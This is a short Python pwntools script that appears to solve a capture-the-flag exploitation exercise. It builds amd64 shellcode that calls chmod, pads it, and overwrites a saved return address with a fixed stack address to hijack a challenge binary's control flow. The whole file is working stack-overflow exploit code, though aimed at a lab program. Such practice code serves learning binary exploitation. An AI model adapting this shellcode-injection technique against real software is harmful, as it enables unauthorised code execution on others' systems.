from pwn import *
context.arch = "amd64"

my_sc = asm('''
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
'''
)
# display the bytes
print(disasm(my_sc))
p = process("/challenge/toddlerone_level2.1")
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("/challenge/toddlerone_level2.1", gdbscript='continue')

p.recvuntil(b"Payload size: ")
p.sendline(b"500")
p.recvuntil(b"Send your payload")
ret = 0x7fffffffd200
p.send(my_sc + b"A"*(0x88 - len(my_sc)) + ret.to_bytes(8,"little"))
all = p.recvall(timeout=1)
print(all.decode())
p.close()

